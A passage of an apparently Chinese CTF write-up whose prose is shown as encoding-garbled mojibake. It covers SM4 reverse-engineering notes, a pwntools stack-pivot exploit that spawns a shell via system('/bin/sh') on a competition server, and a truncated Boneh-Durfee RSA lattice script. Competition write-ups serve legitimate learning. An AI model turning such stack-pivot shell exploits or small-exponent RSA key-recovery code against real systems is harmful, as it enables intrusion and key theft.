src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730199666857-b7d307de-e4a7-4b63-9447-236be0109850.png" class="" title="img"><p>soçš„éƒ¨åˆ†æœ‰ç‚¹å¤æ‚</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730199816877-9b3d3b06-9d3b-4911-8bd5-670088866940.png" class="" title="img"><p>findcryptæ²¡æ‰¾åˆ°ç®—æ³•ç‰¹å¾ï¼Œçœ‹ä¸Šå»æœ‰ç‚¹åƒaesé­”æ”¹ï¼Œå…¶å®å¤§æ¦‚ç‡ä¸å¯èƒ½ï¼Œå› ä¸ºè¿™æ ·çš„è¯ä¸å¯èƒ½ä¸€ç™¾å¤šè§£</p><p>è¯¢é—®aiå¯èƒ½æ˜¯ä»€ä¹ˆç®—æ³•</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730358225456-a6036c00-e881-4c08-b3a4-d2a70a5c167d.png" class="" title="img"><p>32è½®å¾ªç¯é‡Œé¢éƒ½æœ‰å¼‚æˆ–7ï¼Œåé¢å‘ç°æ˜¯ä¸ºäº†å¾—åˆ°sm4æ ‡å‡†çš„sç›’ï¼Œfkæ•°ç»„ï¼Œè¿˜æ˜¯å¯¹sm4ä¸å¤Ÿç†Ÿæ‚‰</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730255167092-042b9890-dcf0-44ce-b443-f32ea78af24a.png" class="" title="img"><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730255988582-7d646697-ca70-4077-a0eb-cb3f3e9e9ca3.png" class="" title="img"><p>ååŠéƒ¨åˆ†keyè¿˜è¦å€’ç€æ¥ï¼Œçœ‹æ±‡ç¼–æ›´åŠ æ˜ç¡®</p><p>qword_3018ç‚¹è¿›å»å‘ç°å€¼ä¸ä¸€æ ·ï¼Œå¯èƒ½æ˜¯æœªæ˜¾ç¤ºå®Œå…¨</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730255650840-6a53adaf-56bc-4bf1-b19d-5fbde985c8a5.png" class="" title="img"><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="short"><a href="#short" class="headerlink" title="short"></a>short</h2><p>æ³„éœ²æ ˆåœ°å€çš„æ ˆè¿ç§»</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730199906582-0e554903-b9fb-4689-9918-e418017b003d.png" class="" title="img"><p>loginä¹‹åæœ‰sytemå’Œ&#x2F;bin&#x2F;shï¼Œç›´æ¥æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><br>filename=<span class="hljs-string">&#x27;./short&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./short&quot;</span>)<br>context(arch=elf.arch,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;0192d5eb59fe7e5c885169079e095fa7.p436.dg04.ciihw.cn&#x27;</span>,<span class="hljs-number">46946</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>leave_ret=<span class="hljs-number">0x8048674</span><br>bin_sh=<span class="hljs-number">0x804A038</span><br>system=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sla(<span class="hljs-string">&quot;Enter your username: &quot;</span>,<span class="hljs-string">b&quot;admin&quot;</span>)<br>sla(<span class="hljs-string">&quot;Enter your password: &quot;</span>,<span class="hljs-string">b&quot;admin123&quot;</span>)<br>ru(<span class="hljs-string">&quot;You will input this: &quot;</span>)<br>s=<span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack:&quot;</span>,<span class="hljs-built_in">hex</span>(s))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(system)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(bin_sh)<br>payload=payload.ljust(<span class="hljs-number">80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p32(s)+p32(leave_ret)<br>sla(<span class="hljs-string">&quot;plz input your msg:\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730171105695-1f7fe17c-e5f8-48a9-a900-3c62da082529.png" class="" title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h2><p>æ‰¾åˆ°åŸé¢˜<a href="https://dexterjie.github.io/2023/09/12/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2023%E9%A2%86%E8%88%AA%E6%9D%AF/#bd">2023æ±Ÿè‹çœé¢†èˆªæ¯ | DexterJieâ€™Blog</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br>time.clock = time.time<br><br>debug = <span class="hljs-literal">True</span><br><br>strict = <span class="hljs-literal">False</span><br><br>helpful_only = <span class="hljs-literal">True</span><br>dimension_min = <span class="hljs-number">7</span>  <span class="hljs-comment"># å¦‚æœæ™¶æ ¼è¾¾åˆ°è¯¥å°ºå¯¸ï¼Œåˆ™åœæ­¢ç§»é™¤</span><br><br><br><span class="hljs-comment"># æ˜¾ç¤ºæœ‰ç”¨çŸ¢é‡çš„ç»Ÿè®¡æ•°æ®</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">helpful_vectors</span>(<span class="hljs-params">BB, modulus</span>):<br>    nothelpful = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= modulus:<br>            nothelpful += <span class="hljs-number">1</span><br><br>        <span class="hljs-built_in">print</span>(nothelpful, <span class="hljs-string">&quot;/&quot;</span>, BB.dimensions()[<span class="hljs-number">0</span>], <span class="hljs-string">&quot; vectors are not helpful&quot;</span>)<br><br><br><span class="hljs-comment"># æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_overview</span>(<span class="hljs-params">BB, bound</span>):<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">0</span>]):<br>        a = (<span class="hljs-string">&#x27;%02d &#x27;</span> % ii)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(BB.dimensions()[<span class="hljs-number">1</span>]):<br>            a += <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> BB[ii, jj] == <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;X&#x27;</span><br>            <span class="hljs-keyword">if</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">60</span>:<br>                a += <span class="hljs-string">&#x27; &#x27;</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            a += <span class="hljs-string">&#x27;~&#x27;</span><br>        <span class="hljs-comment"># print (a)</span><br><br><br><span class="hljs-comment"># å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡</span><br><span class="hljs-comment"># ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_unhelpful</span>(<span class="hljs-params">BB, monomials, bound, current</span>):<br>    <span class="hljs-comment"># æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span><br>    <span class="hljs-keyword">if</span> current == -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> BB.dimensions()[<span class="hljs-number">0</span>] &lt;= dimension_min:<br>        <span class="hljs-keyword">return</span> BB<br><br>    <span class="hljs-comment"># å¼€å§‹ä»åé¢æ£€æŸ¥</span><br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(current, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#  å¦‚æœå®ƒæ²¡æœ‰ç”¨</span><br>        <span class="hljs-keyword">if</span> BB[ii, ii] &gt;= bound:<br>            affected_vectors = <span class="hljs-number">0</span><br>            affected_vector_index = <span class="hljs-number">0</span><br>            <span class="hljs-comment"># è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡</span><br>            <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ii + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                <span class="hljs-comment"># å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š</span><br>                <span class="hljs-comment"># æˆ‘ä»¬å¢åŠ è®¡æ•°</span><br>                <span class="hljs-keyword">if</span> BB[jj, ii] != <span class="hljs-number">0</span>:<br>                    affected_vectors += <span class="hljs-number">1</span><br>                    affected_vector_index = jj<br><br>            <span class="hljs-comment"># ç­‰çº§ï¼š0</span><br>            <span class="hljs-comment"># å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“</span><br>            <span class="hljs-comment"># æˆ‘ä»¬åˆ é™¤å®ƒ</span><br>            <span class="hljs-keyword">if</span> affected_vectors == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># print (&quot;* removing unhelpful vector&quot;, ii)</span><br>                BB = BB.delete_columns([ii])<br>                BB = BB.delete_rows([ii])<br>                monomials.pop(ii)<br>                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">return</span> BB<br><br>            <span class="hljs-comment"># ç­‰çº§ï¼š1</span><br>            <span class="hljs-comment"># å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥</span><br>            <span class="hljs-comment"># å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡</span><br>            <span class="hljs-keyword">elif</span> affected_vectors == <span class="hljs-number">1</span>:<br>                affected_deeper = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(affected_vector_index + <span class="hljs-number">1</span>, BB.dimensions()[<span class="hljs-number">0</span>]):<br>                    <span class="hljs-comment"># å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡</span><br>                    <span class="hljs-comment"># æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª</span><br>                    <span class="hljs-keyword">if</span> BB[kk, affected_vector_index] != <span class="hljs-number">0</span>:<br>                        affected_deeper = <span class="hljs-literal">False</span><br>                <span class="hljs-comment"># å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸”</span><br>                <span class="hljs-comment"># è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨</span><br>                <span class="hljs-comment"># ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯”</span><br>                <span class="hljs-keyword">if</span> affected_deeper <span class="hljs-keyword">and</span> <span class="hljs-built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="hljs-built_in">abs</span>(<br>                        bound - BB[ii, ii]):<br>                    <span class="hljs-comment"># print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br>                    BB = BB.delete_columns([affected_vector_index, ii])<br>                    BB = BB.delete_rows([affected_vector_index, ii])<br>                    monomials.pop(affected_vector_index)<br>                    monomials.pop(ii)<br>                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="hljs-number">1</span>)<br>                    <span class="hljs-keyword">return</span> BB<br>    <span class="hljs-comment"># nothing happened</span><br>    <span class="hljs-keyword">return</span> BB<br><br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">* 0,0   if it fails</span><br><span class="hljs-string">* -1ï¼Œ-1 å¦‚æœ &quot;strict=true&quot;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ</span><br><span class="hljs-string">* x0,y0 the solutions of `pol`</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boneh_durfee</span>(<span class="hljs-params">pol, modulus, mm, tt, XX, YY</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="hljs-string"></span><br><span class="hljs-string"> åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="hljs-string">* d &lt; N^delta</span><br><span class="hljs-string">* |x|&lt; e^delta</span><br><span class="hljs-string">* |y|&lt; e^0.5</span><br><span class="hljs-string">æ¯å½“ delta &lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># substitution (Herrman and May)</span><br>    PR.&lt; u, x, y &gt;= PolynomialRing(ZZ)  <span class="hljs-comment"># å¤šé¡¹å¼ç¯</span><br>    Q = PR.quotient(x * y + <span class="hljs-number">1</span> - u)  <span class="hljs-comment"># u = xy + 1</span><br>    polZ = Q(pol).lift()<br><br>    UU = XX * YY + <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># x-ç§»ä½</span><br>    gg = []<br>    <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mm - kk + <span class="hljs-number">1</span>):<br>            xshift = x ^ ii * modulus ^ (mm - kk) * polZ(u, x, y) ^ kk<br>            gg.append(xshift)<br>    gg.sort()<br><br>    <span class="hljs-comment"># å•é¡¹å¼ x ç§»ä½åˆ—è¡¨</span><br>    monomials = []<br>    <span class="hljs-keyword">for</span> polynomial <span class="hljs-keyword">in</span> gg:<br>        <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> polynomial.monomials():  <span class="hljs-comment"># å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š</span><br>            <span class="hljs-keyword">if</span> monomial <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> monomials:  <span class="hljs-comment"># å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­</span><br>                monomials.append(monomial)<br>    monomials.sort()<br><br>    <span class="hljs-comment"># y-ç§»ä½</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm / tt) * jj, mm + <span class="hljs-number">1</span>):<br>            yshift = y ^ jj * polZ(u, x, y) ^ kk * modulus ^ (mm - kk)<br>            yshift = Q(yshift).lift()<br>            gg.append(yshift)  <span class="hljs-comment"># substitution</span><br><br>    <span class="hljs-comment"># å•é¡¹å¼ y ç§»ä½åˆ—è¡¨</span><br>    <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, tt + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> kk <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(floor(mm / tt) * jj, mm + <span class="hljs-number">1</span>):<br>            monomials.append(u ^ kk * y ^ jj)<br><br>    <span class="hljs-comment"># æ„é€ æ ¼ B</span><br>    nn = <span class="hljs-built_in">len</span>(monomials)<br>    BB = Matrix(ZZ, nn)<br>    <span class="hljs-keyword">for</span> ii <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nn):<br>        BB[ii, <span class="hljs-number">0</span>] = gg[ii](<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">for</span> jj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, ii + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> monomials[jj] <span class="hljs-keyword">in</span> gg[ii].monomials():<br>                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU, XX, YY)<br><br>    <span class="hljs-comment"># çº¦åŒ–æ ¼çš„åŸå‹</span><br>    <span class="hljs-keyword">if</span> helpful_only:<br>        <span class="hljs-comment">#  #è‡ªåŠ¨åˆ é™¤</span><br>        BB = remove_unhelpful(BB, monomials, modulus ^ mm, nn - <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># é‡ç½®ç»´åº¦</span><br>        nn = BB.dimensions()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">if</span> nn == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failure&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br><br>    <span class="hljs-comment"># æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ©</span><br>    <span class="hljs-keyword">if</span> debug:<br>        helpful_vectors(BB, modulus ^ mm)<br><br>    <span class="hljs-comment"># æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š</span><br>    det = BB.det()<br>    bound = modulus ^ (mm * nn)<br>    <span class="hljs-keyword">if</span> det &gt;= bound:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Try with highers m and t.&quot;</span>)<br>        <span class="hljs-keyword">if</span> debug:<br>            diff = (log(det) - 